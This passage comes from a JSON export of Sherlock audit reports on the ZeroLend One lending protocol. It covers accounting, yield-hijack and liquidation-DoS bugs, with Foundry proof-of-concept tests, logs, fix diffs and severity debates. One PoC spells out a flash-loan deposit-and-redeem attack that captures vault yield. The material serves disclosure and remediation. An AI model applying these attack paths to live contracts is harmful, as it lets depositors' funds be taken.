Sorry, this might be coming late, but I don't believe that this issue meets the criteria of becoming a High because;\n> \n> 1. It relies on the pool deployer becoming Malicious, what are the chances?\n> 2. It also relies on the vault managers not doing their due diligence on checking if the pool's strategy is indeed safe.\n> 3. Vault Managers are risk managers and should do their thorough checks on every pool, including oracles and strategy contracts before adding such.\n> \n> The whole reason for validating this is that the pool deployer can hurt the vault manager, but the vault manager should be rational enough to check the rate strategy contract, before trusting a pool.\n\n1. The pool deployer does not need to become malicious. He is malicious by default if it can hurt the Vault.\n2. I agree here, and every Vault Manager should do their own checking, but it doesn't matter because, at any time, he can change the interest rate because he is malicious.\n3. Same as point 2. They are malicious by default, and even if the vault managers do the best check, the pool manager can increase the interest rate at any time.\n\n**Joshuajee**\n\n@cvetanovv,\n\nI agree you are totally right here.\n\nI think that my earlier complaint only affects https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/234\n\nBecause oracles can not be changed after deployment",
      "summary": "\nThis bug report discusses an issue in which a malicious pool creator can set a malicious interest rate contract in a vault, causing all calls to it to revert. This results in users losing their funds when trying to withdraw from the pool. The root cause is allowing the pool deployer to specify any interest rate strategy address. This issue has been escalated to High severity and has duplicates. There is some discussion about the severity of the issue, with some arguing that it is not a High severity issue because it relies on the pool deployer becoming malicious and the vault manager not doing due diligence. However, others argue that the pool deployer is malicious by default and can change the interest rate at any time, making it a High severity issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/233",
      "tags": [],
      "finders": [
        "A2-security",
        "Obsidian",
        "iamnmt"
      ]
    },
    {
      "id": "41815",
      "title": "H-5: `LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228 \n\n## Found by \n000000, A2-security, Bigsam, Honour, dhank, ether\\_sky, imsrybr0, lemonmon, thisvishalsingh, trachev, zarkk01\n### Summary\n\n`LiquidationLogic@_burnCollateralTokens` does not account for liquidation fees when withdrawing collateral during liquidation leading to incorrect accounting and Pools insolvency, ultimately impacting regular flows (.e.g borrows, withdrawals, redemptions, ...) in the protocol for the different actors (.i.e Pools users, Curated Vaults and their users, NFT Positions users).\n\n### Root Cause\n\n[LiquidationLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol)\n```solidity\n// ...\nlibrary LiquidationLogic {\n  // ...\n  function executeLiquidationCall(\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 => address) storage reservesList,\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,\n    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,\n    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,\n    DataTypes.ExecuteLiquidationCallParams memory params\n  ) external {\n    // ...\n\n    (vars.actualCollateralToLiquidate, vars.actualDebtToLiquidate, vars.liquidationProtocolFeeAmount) = // <==== Audit \n    _calculateAvailableCollateralToLiquidate(\n      collateralReserve,\n      vars.debtReserveCache,\n      vars.actualDebtToLiquidate,\n      vars.userCollateralBalance,\n      vars.liquidationBonus,\n      IPool(params.pool).getAssetPrice(params.collateralAsset),\n      IPool(params.pool).getAssetPrice(params.debtAsset),\n      IPool(params.pool).factory().liquidationProtocolFeePercentage()\n    );\n\n    // ...\n\n    _burnCollateralTokens(\n      collateralReserve, params, vars, balances[params.collateralAsset][params.position], totalSupplies[params.collateralAsset]\n    ); // <==== Audit\n\n    if (vars.liquidationProtocolFeeAmount != 0) {\n      // ...\n\n      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);  // <==== Audit\n    }\n\n    // ...\n  }\n\n   function _burnCollateralTokens(\n    DataTypes.ReserveData storage collateralReserve,\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    LiquidationCallLocalVars memory vars,\n    DataTypes.PositionBalance storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal {\n    // ...\n    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate, collateralReserveCache.nextLiquidityIndex); // <==== Audit : actualCollateralToLiquidate doesn't include liquidation fees\n    IERC20(params.collateralAsset).safeTransfer(msg.sender, vars.actualCollateralToLiquidate);\n  }\n\n  // ...\n\n  function _calculateAvailableCollateralToLiquidate(\n    DataTypes.ReserveData storage collateralReserve,\n    DataTypes.ReserveCache memory debtReserveCache,\n    uint256 debtToCover,\n    uint256 userCollateralBalance,\n    uint256 liquidationBonus,\n    uint256 collateralPrice,\n    uint256 debtAssetPrice,\n    uint256 liquidationProtocolFeePercentage\n  ) internal view returns (uint256, uint256, uint256) {\n    // ...\n\n    if (liquidationProtocolFeePercentage != 0) {\n      vars.bonusCollateral = vars.collateralAmount - vars.collateralAmount.percentDiv(liquidationBonus);\n      vars.liquidationProtocolFee = vars.bonusCollateral.percentMul(liquidationProtocolFeePercentage);\n      return (vars.collateralAmount - vars.liquidationProtocolFee, vars.debtAmountNeeded, vars.liquidationProtocolFee);  // <==== Audit\n    } else {\n      return (vars.collateralAmount, vars.debtAmountNeeded, 0);\n    }\n  }\n}\n```\n\n[PositionBalanceConfiguration](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L85-L96)\n```solidity\n  function withdrawCollateral(\n    DataTypes.PositionBalance storage self,\n    DataTypes.ReserveSupplies storage supply,\n    uint256 amount,\n    uint128 index\n  ) internal returns (uint256 sharesBurnt) {\n    sharesBurnt = amount.rayDiv(index);\n    require(sharesBurnt != 0, PoolErrorsLib.INVALID_BURN_AMOUNT);\n    self.lastSupplyLiquidtyIndex = index;\n    self.supplyShares -= sharesBurnt; // <==== Audit\n    supply.supplyShares -= sharesBurnt; // <==== Audit\n  }\n```\n\nWhen there are protocol liquidation fees, `_burnCollateralTokens` doesn't account for liquidation fees when withrawing the collateral, leading to the pool and actor having more supply shares than reality.\n\n### Internal pre-conditions\n\nProtocol liquidations fees are set.\n\n### External pre-conditions\n\nN/A\n\n### Attack Path\nNot an attack path per say as this happens in every liquidation when there are liquidation fees.\n\n1. Alice supplies `tokenA`\n2. Bob supplies `tokenB`\n3. Alice borrows `tokenB`\n4. Alice becomes liquidatable\n5. Bob liquidates Alice\n\n### Impact\n\n* Incorrect accounting : pool and actor supply shares are higher than reality, allowing a liquidated actor to borrow more than what they should really be able to for example.\n* Pools insolvency : since the liquidation fees are transferred to the treasury from the pool but not reflected on the pool and actor supply shares, the actor can withdraw them again at the expense of other actors. This leads to the other actors not being able to fully withdraw their provided collateral and potentially disrupting functionality such as Curated Vaults reallocation where the withdrawn amount cannot be controlled.\n\n### PoC\n\n#### Test\n```solidity\n  function testLiquidationWithFees() external {\n    poolFactory.setLiquidationProtcolFeePercentage(0.05e4);\n\n    _mintAndApprove(alice, tokenA, 3000 ether, address(pool));\n    _mintAndApprove(bob, tokenB, 5000 ether, address(pool));\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, 3000 ether, 0);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 1000 ether, 0);\n    pool.borrowSimple(address(tokenB), alice, 375 ether, 0);\n    vm.stopPrank();\n\n    oracleB.updateAnswer(2.5e8);\n\n    vm.prank(bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, type(uint256).max);\n\n    assertEq(pool.getBalance(address(tokenA), alice, 0), tokenA.balanceOf(address(pool)));\n  }\n```\n\n#### Results\n```console\nforge test --match-test testLiquidationWithFees\n[⠢] Compiling...\nNo files changed, compilation skipped\n\nRan 1 test for test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[FAIL. Reason: assertion failed: 17968750000000000000 != 15625000000000000000] testLiquidationWithFees() (gas: 1003975)\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.25ms (1.62ms CPU time)\n\nRan 1 test suite in 347.96ms (5.25ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/forge/core/pool/PoolLiquidationTests.t.sol:PoolLiquidationTest\n[FAIL. Reason: assertion failed: 17968750000000000000 != 15625000000000000000] testLiquidationWithFees() (gas: 1003975)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n```\n\n### Mitigation\n\n```diff\ndiff --git a/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol b/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol\nindex e89d626..0a48da6 100644\n--- a/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol\n+++ b/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol\n@@ -225,7 +225,7 @@ library LiquidationLogic {\n     );\n\n     // Burn the equivalent amount of aToken, sending the underlying to the liquidator\n-    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate, collateralReserveCache.nextLiquidityIndex);\n+    balances.withdrawCollateral(totalSupplies, vars.actualCollateralToLiquidate + vars.liquidationProtocolFeeAmount, collateralReserveCache.nextLiquidityIndex);\n     IERC20(params.collateralAsset).safeTransfer(msg.sender, vars.actualCollateralToLiquidate);\n   }\n```",
      "summary": "\nIssue H-5 is a problem with the code `LiquidationLogic@_burnCollateralTokens` in the project 2024-06-new-scope-judging. This code does not account for liquidation fees when withdrawing collateral during a liquidation process. This leads to incorrect accounting and can cause the pools to become insolvent, affecting regular processes in the protocol for different users. The root cause of this issue is that the code does not include the liquidation fees when calculating the available collateral to liquidate. This can have a negative impact on the protocol, such as allowing liquidated users to borrow more than they should be able to. A possible solution to this problem is to update the code to include the liquidation fees when withdrawing collateral. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228",
      "tags": [],
      "finders": [
        "lemonmon",
        "imsrybr0",
        "zarkk01",
        "thisvishalsingh",
        "000000",
        "trachev",
        "ether\\_sky",
        "Honour",
        "dhank",
        "A2-security",
        "Bigsam"
      ]
    },
    {
      "id": "41814",
      "title": "H-4: An attacker can hijack the `CuratedVault`'s matured yield",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199 \n\n## Found by \n0xAlix2, 0xc0ffEE, A2-security, JCN, Obsidian, TessKimy, Varun\\_05, dhank, ether\\_sky, iamnmt, trachev, zarkk01\n### Summary\n\n`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the `CuratedVault`'s matured yield.\n\n### Root Cause\n\n`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372\n\n```solidity\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nLet's have:\n- A vault has a total assets of `totalAssets`\n- `X` amount of yield is accrued from `T1` to `T2`\n\n1. The attacker takes a flash loan of `flashLoanAmount`\n2. The attacker deposits `flashLoanAmount` at `T2` to the vault. Since `CuratedVault#totalAssets` does not update pool's `liquidityIndex`, the minted shares are calculated based on the total assets at `T1`.\n3. The attacker redeems all the shares and benefits from `X` amount of yield.\n4. The attacker repays the flash loan.\n\nThe cost of this attack is gas fee and flash loan fee.\n\n### Impact\n\nThe attacker hijacks `flashLoanAmount / (flashLoanAmount + totalAssets)` percentage of `X` amount of yield.\n\n`X` could be a considerable amount when:\n- The pool has high interest rate.\n- `T2 - T1` is large. This is the case for the pool with low interactions.\n\nWhen `X` is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.\n\n### PoC\n\nDue to a bug in `PositionBalanceConfiguration#getSupplyBalance` that we submitted in a different issue, fix the `getSupplyBalance` function before running the PoC\n\n`core/pool/configuration/PositionBalanceConfiguration.sol`\n\n```diff\nlibrary PositionBalanceConfiguration {\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-   return self.supplyShares + increase;\n+   return self.supplyShares.rayMul(index);\n  }\n}\n```\n\nRun command: `forge test --match-path test/PoC/PoC.t.sol`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {console} from 'lib/forge-std/src/Test.sol';\nimport '../forge/core/vaults/helpers/IntegrationVaultTest.sol';\n\ncontract ERC4626Test is IntegrationVaultTest {\n  address attacker = makeAddr('attacker');\n\n  function setUp() public {\n    _setUpVault();\n    _setCap(allMarkets[0], CAP);\n    _sortSupplyQueueIdleLast();\n\n    oracleB.updateRoundTimestamp();\n    oracle.updateRoundTimestamp();\n\n    uint256 vaultAssets = 10 ether;\n\n    loanToken.mint(supplier, vaultAssets);\n    vm.prank(supplier);\n    vault.deposit(vaultAssets, supplier);\n    \n    vm.prank(attacker);\n    loanToken.approve(address(vault), type(uint256).max);\n  }\n\n  function testDeposit() public {\n    collateralToken.mint(borrower, type(uint128).max);\n\n    vm.startPrank(borrower);\n    allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);\n    allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);\n\n    skip(100 days);\n\n    oracleB.updateRoundTimestamp();\n    oracle.updateRoundTimestamp();\n\n    uint256 vaultAssetsBefore = vault.totalAssets();\n\n    console.log(\"Vault's assets before updating reserve: %e\", vaultAssetsBefore);\n\n    uint256 snapshot = vm.snapshot();\n\n    allMarkets[0].forceUpdateReserve(address(loanToken));\n    console.log(\"Vault's accrued yield: %e\", vault.totalAssets() - vaultAssetsBefore);\n\n    vm.revertTo(snapshot);\n\n    uint256 flashLoanAmount = 100 ether;\n\n    loanToken.mint(attacker, flashLoanAmount);\n\n    vm.startPrank(attacker);\n    uint256 shares = vault.deposit(flashLoanAmount, attacker);\n    vault.redeem(shares, attacker, attacker);\n    vm.stopPrank();\n\n    console.log(\"Attacker's profit: %e\", loanToken.balanceOf(attacker) - flashLoanAmount);\n  }\n}\n```\n\nLogs:\n\n```bash\n  Vault's assets before updating reserve: 1e19\n  Vault's accrued yield: 5.62832773326440941e17\n  Attacker's profit: 5.11666157569491763e17\n```\n\nAlthough the yield accrued, the vault's assets before updating reserve is still `1e19`.\n\n### Mitigation\n\nUpdate pool's `liquidityIndex` at the beginning of `CuratedVault#totalAssets` \n\n```diff\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n+     withdrawQueue[i].forceUpdateReserve(asset());\n      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\n\n\n## Discussion\n\n**DemoreXTess**\n\nEscalate\n\nThis should be classified as high severity. Due to the outdated totalAssets, all actions that rely on totalAssets, such as supplying assets, will result in a loss of funds. The minted shares will be incorrect whenever a user supplies assets to the vault. This not only exposes the protocol to flash loan attacks but also causes a direct loss of funds for users. Therefore, the severity of the issue should be high.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This should be classified as high severity. Due to the outdated totalAssets, all actions that rely on totalAssets, such as supplying assets, will result in a loss of funds. The minted shares will be incorrect whenever a user supplies assets to the vault. This not only exposes the protocol to flash loan attacks but also causes a direct loss of funds for users. Therefore, the severity of the issue should be high.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nI agree that this issue meets the requirements for High severity:\n\n> Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nDue to the stale `totalAssets` data, all actions that depend on this function can result in user losses without requiring any external conditions to be met.\n\nPlanning to accept the escalation and make this issue High severity.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199/#issuecomment-2391738167): accepted",
      "summary": "\nThe bug report describes a vulnerability in a system called `CuratedVault` where an attacker can exploit a flaw in the code to hijack the matured yield, resulting in a loss of funds for users. The root cause of the issue is that the `CuratedVault#totalAssets` function does not update the pool's `liquidityIndex` at the beginning, which allows the attacker to manipulate the system and benefit from the accrued yield. The attack path involves the attacker taking a flash loan, depositing it into the vault, and then redeeming the shares to receive the yield. The impact of this attack can be significant, especially in pools with high interest rates and low interactions. A proof of concept (PoC) is provided to demonstrate the vulnerability. The issue has been classified as high severity and has been resolved. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199",
      "tags": [],
      "finders": [
        "TessKimy",
        "zarkk01",
        "JCN",
        "0xc0ffEE",
        "trachev",
        "ether\\_sky",
        "0xAlix2",
        "dhank",
        "Varun\\_05",
        "Obsidian",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41813",
      "title": "H-3: Liquidation can be DOSed due to lack of liquidity on collateral asset reserve",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198 \n\n## Found by \nA2-security, Flashloan44, Obsidian, almurhasan, zarkk01\n### Summary\n\nLack of liquidity on collateral asset reserves can cause disruption to liquidation. \n\n### Root Cause\n\nThe protocol don't have option to disable borrowing or withdrawing in a particular asset reserve for a certain extent to protect the collateral deposits. It can only [disable borrowing](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L166-L167) or [freeze](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L148-L149) the whole reserves but not for specific portion such as collateral deposits. This can be a big problem because someone can always deduct or empty the reserves either by withdrawing their lended assets or borrowing loan. And when the liquidation comes, the collateral can't be paid to liquidator because the asset reserve is already not enough or emptied.\n\nThe pool administrator might suggest designating whole asset reserve to be used only for collateral deposit purposes and not for lending and borrowing. However this can be circumvented by malicious users by transferring their collateral to other reserves that accepts borrowing and lending which can eventually led the collateral to be borrowed. This is the nature of multi-asset lending protocol, it allows multiple asset reserves for borrowing and lending as per protocol documentation.\n\nThere could be another suggestion to resolve this by only using one asset reserve per pool that offers lending and borrowing but this will already contradict on what the protocol intends to be which is to be a multi-asset lending pool, meaning there are multiple assets offering lending in single pool.\n\nIf the protocol intends to do proper multi-asset lending pool platform, it should protect the collateral assets regarding liquidity issues. \n\n### Internal pre-conditions\n\n1. Pool creator should setup the pool with more than 2 asset reserves offering lending or borrowing and each of reserves accepts collateral deposits. It allows any of the asset reserves to conduct borrowing to any other asset reserves and vice versa. This is pretty much the purpose and design of the multi-asset lending protocol as per documentation.\n\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nThis can be considered as attack path or can happen also as normal scenario due to the nature or design of the multi-asset lending protocol. Take note the step 6 can be just a normal happening or deliberate attack to disrupt the liquidation.\n\n<img width=\"579\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3a33a2b1-1e9d-4cc5-8463-8b4a4fcc5f46\">\n\n\n\n### Impact\nThis should be high risk since in a typical normal scenario, this vulnerability can happen without so much effort.\nThe protocol also suffers from bad debt as the loan can't be liquidated.\n\n### PoC\n\n1. Modify this test file /zerolend-one/test/forge/core/pool/PoolLiquidationTests.t.sol\nand insert the following:\na. in line 16, put address carl = address(3); // add carl as borrower\nb.  modify this function _generateLiquidationCondition() internal {\n    _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB\n    _mintAndApprove(carl, tokenB, mintAmountB, address(pool)); // carl 2000 tokenB >>> add this line \n\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply\n    vm.stopPrank();\n\n    vm.startPrank(carl);\n    pool.supplySimple(address(tokenB), carl, supplyAmountB, 0); // 750 tokenB carl supply >>> add this portion\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n\n    assertEq(tokenB.balanceOf(alice), borrowAmountB);\n\n    oracleA.updateAnswer(5e3);\n  }\n  c. Insert this test\n  function testLiquidationSimple2() external {\n    _generateLiquidationCondition();\n    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);\n\n    vm.startPrank(carl);\n    pool.borrowSimple(address(tokenA), carl, borrowAmountB, 0); // 100 tokenA carl borrow to deduct the reserves in which the collateral is deposited\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    vm.expectRevert();\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10 ether); // Bob tries to liquidate Alice but will revert\n\n    vm.stopPrank();\n\n    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);\n\n    // Ensure that no liquidation happened and Alice's debt remains the same\n    assertEq(totalDebtBase, totalDebtBaseNew, \"Debt should remain the same after failed liquidation\");\n\n  }\n  2. Run the test forge test -vvvv --match-contract PoolLiquidationTest --match-test testLiquidationSimple2\n\n### Mitigation\n\nEach asset reserve should be modified to not allow borrowing or withdrawing for certain collateral deposits. For example, if a particular asset reserve has deposits for collateral, these deposits should not be allowed to be borrowed or withdrew. The rest of the balance of asset reserves will do the lending. At the current design, the pool admin can only make the whole reserve as not enabled for borrowing but not for specific account or amount.\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  see #147\n\n\n\n**0xspearmint1**\n\nThis issue should be high severity, it satisfies Sherlock's [criteria](https://docs.sherlock.xyz/audits/real-time-judging/judging#iv.-how-to-identify-a-high-issue) for high issues\n\n>Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nThe attacker can easily delay the liquidation till bad debt accumulates which will be a >1% loss for the lender \n\n\n\n\n**Haxatron**\n\nEscalate\n\nFinal time to use this \n\n**sherlock-admin3**\n\n> Escalate\n> \n> Final time to use this \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThis issue does not qualify as high severity.\n\nThe vulnerability arises because the protocol allows collateral to be borrowed, which can lead to temporary liquidation failures due to insufficient liquidity in the pool. \n\nHowever, for a user to withdraw all the funds from a pool and cause this scenario, he would need a large amount of capital. Even if they succeed in doing so, the DoS on liquidations is only temporary because the borrower must eventually return the borrowed funds, and they will also incur interest costs.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xjuaan**\n\n@cvetanovv \n\n> and they will also incur interest costs\n\nThe interest cost will never need to be paid, because the borrow will not be liquidateable.\n\n> he DoS on liquidations is only temporary because the borrower must eventually return the borrowed funds\n\nThe DoS on liquidations is not temporary because the borrow will never need to be repaid (because there is no risk of liquidation from accrued interest, because all the collateral is borrowed)\nEven if it was temporary, a DoS of liquidations can be weaponised to lead to bad debt, which is >1% profit for the attacker (at the expense of depositors) since their borrowed funds will be worth more than their collateral provided. \n\nBased on the above, it is clearly a high severity issue. It has arised due to forking AAVE but not allowing representative aTokens to be seized, as mentioned in #318:\n> This is a known issue that aave have mitigated by allowing liquidators to seize ATokens instead of underlying tokens, when there is not enough liquidity in the pools.\n> To achieve the modularity expected zerolend have tried to simplify the design by removing this core functionality, this however exposes the protocol to the risk of liquidation being blocked if there is not enough liquidity in the pools.\n\n\n\n\n\n**Honour-d-dev**\n\ni agree with @cvetanovv \nthere will always be costs for the attacker, as all assets ltv must be less than 1 so the attacker will have to deposit more in value than they borrow. Combined with their growing interest that, they'll have to either repay the loan + interest to retrieve their initial capital or don't repay and still suffer losses as borrowing is overcollateralized.\nThis is a temporary DOS at best.\n\n**0xjuaan**\n\nAs I explained, it's a DOS of liquidation which directly leads to bad debt when collateral value keeps dropping, where the attacker's borrowed funds is worth more than their collateral, so they steal funds via this DOS\n\nThey don't need to repay and collect their collateral as the debt is worth more (due to bad debt)\n\n\n**cvetanovv**\n\nI will accept the escalation. In theory, a malicious user with very large capital could DoS the liquidation without any constraints, and does not have to return the collateral.\n\nPlanning to accept the escalation and make this issue High severity.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [haxatron](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198/#issuecomment-2394853491): accepted",
      "summary": "\nThe bug report discusses an issue with the lack of liquidity on collateral asset reserves in a multi-asset lending protocol. This can lead to disruption in liquidation and bad debt. The root cause is that the protocol does not have the option to disable borrowing or withdrawing in a specific asset reserve to protect the collateral deposits. This can be exploited by malicious users by deducting or emptying the reserves, preventing liquidators from being paid. The suggested solutions either contradict the purpose of the protocol or can still be circumvented by attackers. The impact of this issue is high, as it can lead to definite loss of funds and bad debt. A proof of concept has been provided and the issue has been escalated to high severity.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198",
      "tags": [],
      "finders": [
        "zarkk01",
        "almurhasan",
        "Obsidian",
        "A2-security",
        "Flashloan44"
      ]
    },
    {
      "id": "41812",
      "title": "H-2: Full Liquidation Won't Sweep the Whole Debts With Leaving Some, And Will Wrongly Set Borrowing as False",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107 \n\n## Found by \n000000, 0xAlix2, 0xc0ffEE, A2-security, Bigsam, Honour, JCN, KupiaSec, Nihavent, Obsidian, TessKimy, Varun\\_05, almurhasan, coffiasd, dany.armstrong90, dhank, ether\\_sky, iamnmt, silver\\_eth, stuart\\_the\\_minion, trachev, zarkk01\n\n## Summary\n\nWhen a liquidator tries to full liquidation (to cover full debts), there will leave some uncovered debts and the liquidation will wrongly set borrowing status of the debt asset as false.\n\n## Vulnerability Detail\n\nAccording to the [comment](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/interfaces/pool/IPoolSetters.sol#L143-L144) in `IPoolSetters.sol`, `debtToCover` parameter of the `liquidate()` function is intended to be debt assets, not shares.\n\n> The caller (liquidator) covers `debtToCover` amount of debt of the user getting liquidated, and receives a proportionally amount of the `collateralAsset` plus a bonus to cover market risk\n\nBut the `_calculateDebt` function call in the `executeLiquidationCall()` do the operations on debt shares to calculate debt amount to cover and collateral amount to buy.\n\n```solidity\n  function _calculateDebt(\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    uint256 healthFactor,\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances\n  ) internal view returns (uint256, uint256) {\n    uint256 userDebt = balances[params.debtAsset][params.position].debtShares;\n\n    uint256 closeFactor = healthFactor > CLOSE_FACTOR_HF_THRESHOLD ? DEFAULT_LIQUIDATION_CLOSE_FACTOR : MAX_LIQUIDATION_CLOSE_FACTOR;\n\n    uint256 maxLiquidatableDebt = userDebt.percentMul(closeFactor);\n\n    uint256 actualDebtToLiquidate = params.debtToCover > maxLiquidatableDebt ? maxLiquidatableDebt : params.debtToCover;\n\n    return (userDebt, actualDebtToLiquidate);\n  }\n```\n\nAccording to this function, the return values `userDebt` and `actualDebtToLiquidate` are debt shares because they are not multiplied by borrow index.\n\nMeanwhile, on the collateral reserve side, the `vars.userCollateralBalance` value that is provided as collateral balance to the `_calculateAvailableCollateralToLiquidate()` function, is collateral shares not assets. ([pool/logic/LiquidationLogic.sol#L136-L148](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L136-L148))\n\n```solidity\n    vars.userCollateralBalance = balances[params.collateralAsset][params.position].supplyShares;\n\n    (vars.actualCollateralToLiquidate, vars.actualDebtToLiquidate, vars.liquidationProtocolFeeAmount) =\n      _calculateAvailableCollateralToLiquidate(\n        collateralReserve,\n        vars.debtReserveCache,\n        vars.actualDebtToLiquidate,\n        vars.userCollateralBalance, // @audit-info Supply shares not assets\n        vars.liquidationBonus,\n        IPool(params.pool).getAssetPrice(params.collateralAsset),\n        IPool(params.pool).getAssetPrice(params.debtAsset),\n        IPool(params.pool).factory().liquidationProtocolFeePercentage()\n      );\n```\n\nAs there is no shares-to-assets conversion in the `_calculateAvailableCollateralToLiquidate()` function, the return values of the function `vars.actualCollateralToLiquidate`, `vars.actualDebtToLiquidate`, `vars.liquidationProtocolFeeAmount` are shares.\n\nThe remaining liquidation flow totally treat these share values as asset 